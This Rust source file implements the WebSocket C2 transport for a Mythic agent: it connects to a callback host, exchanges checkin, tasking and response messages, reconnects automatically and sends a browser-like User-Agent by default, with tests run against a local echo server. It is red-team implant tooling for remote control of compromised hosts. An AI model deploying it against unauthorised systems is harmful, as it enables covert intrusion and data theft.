//! WebSocket transport for the Mythic `websocket` C2 profile.
//!
//! Maintains a single persistent WebSocket connection across checkin/get_tasking/
//! post_response calls. Ping frames are answered automatically, and the connection
//! is recreated automatically after a close frame or IO error. TLS is handled by
//! `tungstenite`'s `rustls` or `native-tls` feature.

use std::cell::RefCell;
use std::collections::{HashMap, VecDeque};
use std::net::TcpStream;
use std::time::Duration;

use tungstenite::error::Error as WsError;
use tungstenite::stream::MaybeTlsStream;
use tungstenite::{Message, WebSocket};

use crate::{C2Transport, MythicError, MythicResult};

use super::DEFAULT_USER_AGENT;

/// How long `read()` blocks while waiting for a matching server response before
/// the connection is considered stale and eligible for reconnect.
const READ_TIMEOUT: Duration = Duration::from_secs(60);

/// Maximum consecutive connect/send/read attempts before giving up.
const MAX_ATTEMPTS: usize = 2;

/// Configuration for the Mythic `websocket` C2 profile.
#[derive(Debug, Clone, Default, serde::Deserialize, serde::Serialize)]
pub struct WebsocketConfig {
    pub aes_psk: Option<String>,
    pub callback_host: String,
    pub callback_port: u16,
    pub endpoint: String,
    pub encrypted_exchange_check: bool,
    #[serde(default)]
    pub headers: HashMap<String, String>,
    /// Optional User-Agent for the WebSocket handshake. Defaults to a benign
    /// browser UA when not set.
    #[serde(default)]
    pub user_agent: Option<String>,
}

/// Synchronous WebSocket transport with connection reuse.
pub struct WebsocketTransport {
    config: WebsocketConfig,
    socket: RefCell<Option<WebSocket<MaybeTlsStream<TcpStream>>>>,
    /// Responses received out-of-order (e.g. a server-pushed `get_tasking`
    /// frame that arrived during a `post_response`).
    pending: RefCell<VecDeque<String>>,
}

impl WebsocketTransport {
    pub fn new(config: WebsocketConfig) -> MythicResult<Self> {
        Ok(Self {
            config,
            socket: RefCell::new(None),
            pending: RefCell::new(VecDeque::new()),
        })
    }

    /// Build the WebSocket URL from `callback_host`, `callback_port` and the
    /// configured endpoint, avoiding duplicated ports if the host already
    /// includes one.
    fn ws_url(&self) -> String {
        let host = self.config.callback_host.trim_end_matches('/');
        let (scheme, authority) = if let Some(stripped) = host
            .strip_prefix("https://")
            .or_else(|| host.strip_prefix("http://"))
            .or_else(|| host.strip_prefix("wss://"))
            .or_else(|| host.strip_prefix("ws://"))
        {
            let scheme = if host.starts_with("https://") || host.starts_with("wss://") {
                "wss"
            } else {
                "ws"
            };
            (scheme, stripped.to_string())
        } else if host.contains(':') {
            // Treat a bare `host:port` as already containing the authority.
            let scheme = if self.config.callback_port == 443 || self.config.callback_port == 8443 {
                "wss"
            } else {
                "ws"
            };
            (scheme, host.to_string())
        } else {
            let scheme = if self.config.callback_port == 443 || self.config.callback_port == 8443 {
                "wss"
            } else {
                "ws"
            };
            (scheme, format!("{}:{}", host, self.config.callback_port))
        };

        let path = self.config.endpoint.trim_start_matches('/');
        if path.is_empty() {
            format!("{}://{}", scheme, authority)
        } else {
            format!("{}://{}/{}", scheme, authority, path)
        }
    }

    fn user_agent(&self) -> &str {
        self.config
            .user_agent
            .as_deref()
            .or_else(|| self.config.headers.get("User-Agent").map(String::as_str))
            .unwrap_or(DEFAULT_USER_AGENT)
    }

    fn connect(&self) -> MythicResult<WebSocket<MaybeTlsStream<TcpStream>>> {
        let url = self.ws_url();
        let uri = url
            .parse::<tungstenite::http::Uri>()
            .map_err(|e| MythicError::transport(format!("bad WebSocket URL: {e}")))?;

        let mut builder = tungstenite::ClientRequestBuilder::new(uri);
        let mut has_ua = false;
        for (k, v) in &self.config.headers {
            if k.eq_ignore_ascii_case("user-agent") {
                has_ua = true;
            }
            builder = builder.with_header(k.as_str(), v.as_str());
        }
        if !has_ua {
            builder = builder.with_header("User-Agent", self.user_agent());
        }

        let (socket, _resp) =
            tungstenite::connect(builder).map_err(|e| MythicError::transport(format!("{e}")))?;

        Self::set_read_timeout(&socket, Some(READ_TIMEOUT))
            .map_err(|e| MythicError::transport(format!("set_read_timeout: {e}")))?;

        Ok(socket)
    }

    /// Try to set a read timeout on the underlying TCP stream so a dead or
    /// silent server does not block the agent forever.
    fn set_read_timeout(
        socket: &WebSocket<MaybeTlsStream<TcpStream>>,
        dur: Option<Duration>,
    ) -> std::io::Result<()> {
        match socket.get_ref() {
            MaybeTlsStream::Plain(s) => s.set_read_timeout(dur),
            #[cfg(feature = "native-tls")]
            MaybeTlsStream::NativeTls(s) => s.get_ref().set_read_timeout(dur),
            #[cfg(feature = "rustls")]
            MaybeTlsStream::Rustls(s) => s.get_ref().set_read_timeout(dur),
            _ => Ok(()),
        }
    }

    fn action_of(body: &str) -> Option<String> {
        serde_json::from_str::<serde_json::Value>(body)
            .ok()
            .and_then(|v| v.get("action").and_then(|a| a.as_str().map(String::from)))
    }

    /// Send `packed` and wait for a server frame whose `action` field equals
    /// `expected_action`. Ping/Pong frames are handled, close frames trigger an
    /// automatic reconnect (once), and out-of-order responses are queued for the
    /// next matching call.
    fn send_receive(&self, expected_action: &str, packed: &str) -> MythicResult<String> {
        // Check queued responses from earlier out-of-order server pushes.
        let queued_idx = self
            .pending
            .borrow()
            .iter()
            .position(|m| Self::action_of(m).as_deref() == Some(expected_action));
        if let Some(idx) = queued_idx {
            return Ok(self.pending.borrow_mut().remove(idx).expect("present"));
        }

        let mut attempts = 0;
        'attempt: loop {
            attempts += 1;
            if attempts > MAX_ATTEMPTS {
                return Err(MythicError::ConnectionFailed);
            }

            // (Re)connect if necessary.
            {
                let mut sock = self.socket.borrow_mut();
                if sock.is_none() {
                    *sock = Some(self.connect()?);
                }
            }

            // Send the request.
            {
                let mut sock = self.socket.borrow_mut();
                let socket = sock.as_mut().ok_or(MythicError::ConnectionFailed)?;
                if socket.send(Message::Text(packed.to_string())).is_err() {
                    *sock = None;
                    continue 'attempt;
                }
            }

            // Read until we get a matching response or a fatal error.
            loop {
                let msg = {
                    let mut sock = self.socket.borrow_mut();
                    let socket = sock.as_mut().ok_or(MythicError::ConnectionFailed)?;
                    match socket.read() {
                        Ok(m) => m,
                        Err(WsError::ConnectionClosed) => {
                            *sock = None;
                            continue 'attempt;
                        }
                        Err(WsError::Io(ref e)) if e.kind() == std::io::ErrorKind::WouldBlock => {
                            // Read timeout: the server was silent for too long.
                            *sock = None;
                            continue 'attempt;
                        }
                        Err(e) => {
                            *sock = None;
                            return Err(MythicError::transport(format!("{e}")));
                        }
                    }
                };

                match msg {
                    Message::Text(body) => match Self::action_of(&body).as_deref() {
                        Some(a) if a == expected_action => return Ok(body),
                        Some(_) => self.pending.borrow_mut().push_back(body),
                        None => return Ok(body),
                    },
                    Message::Binary(bytes) => {
                        let body = String::from_utf8(bytes).map_err(|_| MythicError::Utf8)?;
                        match Self::action_of(&body).as_deref() {
                            Some(a) if a == expected_action => return Ok(body),
                            Some(_) => self.pending.borrow_mut().push_back(body),
                            None => return Ok(body),
                        }
                    }
                    Message::Ping(data) => {
                        let mut sock = self.socket.borrow_mut();
                        if let Some(socket) = sock.as_mut() {
                            let _ = socket.send(Message::Pong(data));
                        }
                    }
                    Message::Pong(_) => {}
                    Message::Close(_) => {
                        *self.socket.borrow_mut() = None;
                        continue 'attempt;
                    }
                    Message::Frame(_) => {}
                }
            }
        }
    }
}

impl C2Transport for WebsocketTransport {
    fn get_aes_psk(&self) -> Option<String> {
        self.config.aes_psk.clone()
    }

    fn set_aes_psk(&mut self, key: &str) -> Option<String> {
        self.config.aes_psk = Some(key.to_string());
        self.config.aes_psk.clone()
    }

    fn encrypted_exchange_check(&self) -> bool {
        self.config.encrypted_exchange_check
    }

    fn checkin(&self, packed: &str) -> Result<String, MythicError> {
        self.send_receive("checkin", packed)
    }

    fn get_tasking(&self, packed: &str) -> Result<String, MythicError> {
        self.send_receive("get_tasking", packed)
    }

    fn post_response(&self, packed: &str) -> Result<String, MythicError> {
        self.send_receive("post_response", packed)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;
    use std::thread;

    fn run_echo_server() -> u16 {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        thread::spawn(move || {
            let (stream, _) = listener.accept().unwrap();
            let mut ws = tungstenite::accept(stream).unwrap();
            while let Ok(msg) = ws.read() {
                match msg {
                    tungstenite::Message::Text(text) => {
                        if text == "close" {
                            break;
                        }
                        ws.send(tungstenite::Message::Text(text)).unwrap();
                    }
                    tungstenite::Message::Close(_) => break,
                    _ => {}
                }
            }
            let _ = ws.close(None);
        });
        port
    }

    #[test]
    fn websocket_roundtrip() {
        let port = run_echo_server();
        let cfg = WebsocketConfig {
            callback_host: "127.0.0.1".into(),
            callback_port: port,
            endpoint: "ws".into(),
            ..Default::default()
        };
        let t = WebsocketTransport::new(cfg).unwrap();
        let req = r#"{"action":"checkin","data":"hello"}"#;
        let resp = t.checkin(req).unwrap();
        assert_eq!(resp, req);
    }

    #[test]
    fn websocket_reconnects_after_close() {
        let port = run_echo_server();
        let cfg = WebsocketConfig {
            callback_host: "127.0.0.1".into(),
            callback_port: port,
            endpoint: "ws".into(),
            ..Default::default()
        };
        let t = WebsocketTransport::new(cfg).unwrap();

        // First request succeeds and the server closes after sending the echo.
        let req = r#"{"action":"checkin","data":"first"}"#;
        assert_eq!(t.checkin(req).unwrap(), req);

        // Second request should automatically open a new connection.
        let req2 = r#"{"action":"checkin","data":"second"}"#;
        assert_eq!(t.checkin(req2).unwrap(), req2);
    }

    #[test]
    fn websocket_out_of_order_responses_are_queued() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        thread::spawn(move || {
            let (stream, _) = listener.accept().unwrap();
            let mut ws = tungstenite::accept(stream).unwrap();
            // Read the post_response request.
            let _ = ws.read();
            // Push a get_tasking message before answering the post_response.
            ws.send(tungstenite::Message::Text(
                r#"{"action":"get_tasking","tasks":[{"id":1}]}"#.into(),
            ))
            .unwrap();
            ws.send(tungstenite::Message::Text(
                r#"{"action":"post_response","status":"success"}"#.into(),
            ))
            .unwrap();
            let _ = ws.close(None);
        });

        let cfg = WebsocketConfig {
            callback_host: "127.0.0.1".into(),
            callback_port: port,
            endpoint: "ws".into(),
            ..Default::default()
        };
        let t = WebsocketTransport::new(cfg).unwrap();

        let post_resp = t
            .post_response(r#"{"action":"post_response","responses":[]}"#)
            .unwrap();
        assert!(post_resp.contains("post_response"));

        // The pushed get_tasking should have been queued and returned on the
        // next get_tasking call without sending a new request.
        let tasking = t.get_tasking(r#"{"action":"get_tasking"}"#).unwrap();
        assert!(tasking.contains("tasks"));
    }
}
